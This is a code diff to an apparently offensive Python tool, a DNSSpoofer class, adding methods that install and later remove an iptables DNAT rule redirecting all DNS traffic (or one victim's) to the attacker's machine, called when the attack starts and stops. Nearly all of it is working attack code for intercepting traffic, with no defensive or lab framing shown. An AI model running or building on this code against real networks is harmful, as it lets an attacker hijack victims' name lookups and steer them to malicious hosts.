@@ -181,6 +181,60 @@ class DNSSpoofer:
         except Exception as e:
             self.logger.error(f"Error in packet callback: {e}")
     
+    def _setup_iptables(self):
+        """Setup iptables rules to redirect DNS traffic to our sniffer"""
+        try:
+            # Rule: Redirect all DNS queries to our attacker IP
+            cmd = [
+                "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
+                "-p", "udp", "--dport", "53",
+                "-j", "DNAT",
+                "--to-destination", f"{self.attacker_ip}:53"
+            ]
+            
+            if self.victim_ip:
+                # Only redirect from specific victim
+                cmd.insert(6, "-s")
+                cmd.insert(7, self.victim_ip)
+            
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                self.logger.info(f"✅ iptables rule added: DNS traffic → {self.attacker_ip}:53")
+                self.iptables_rules_added = True
+                return True
+            else:
+                self.logger.warning(f"⚠️ iptables rule may have failed: {result.stderr}")
+                return False
+        except Exception as e:
+            self.logger.error(f"❌ Error setting up iptables: {e}")
+            self.logger.info("Make sure you're running: sudo python3 app.py")
+            return False
+    
+    def _cleanup_iptables(self):
+        """Remove iptables rules"""
+        if not self.iptables_rules_added:
+            return
+        
+        try:
+            # Remove rule: Redirect all DNS queries
+            cmd = [
+                "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
+                "-p", "udp", "--dport", "53",
+                "-j", "DNAT",
+                "--to-destination", f"{self.attacker_ip}:53"
+            ]
+            
+            if self.victim_ip:
+                cmd.insert(6, "-s")
+                cmd.insert(7, self.victim_ip)
+            
+            subprocess.run(cmd, capture_output=True, timeout=5)
+            self.logger.info("✅ iptables rules removed")
+            self.iptables_rules_added = False
+        except Exception as e:
+            self.logger.error(f"Error removing iptables rules: {e}")
+    
     def start_attack(self):
         """Start DNS spoofing attack"""
         if self.is_running:
@@ -190,6 +244,9 @@ class DNSSpoofer:
         self.is_running = True
         self.packets_spoofed = 0
         self.start_time = time.time()
+        
+        # Setup iptables to redirect DNS traffic to us
+        self._setup_iptables()
         
         # Start sniffing in background thread
         self.sniff_thread = threading.Thread(
@@ -253,6 +310,9 @@ class DNSSpoofer:
         # Wait for thread to finish
         if self.sniff_thread and self.sniff_thread.is_alive():
             self.sniff_thread.join(timeout=2)
+        
+        # Remove iptables rules
+        self._cleanup_iptables()
         
         # Log statistics
         duration = time.time() - self.start_time if self.start_time else 0
